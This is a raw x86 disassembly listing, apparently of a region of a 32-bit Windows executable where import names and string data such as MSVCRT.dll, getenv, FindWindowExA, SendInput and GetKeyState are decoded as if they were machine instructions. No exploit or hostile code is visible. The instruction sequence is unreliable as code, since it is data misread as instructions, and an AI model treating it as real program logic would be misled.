  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
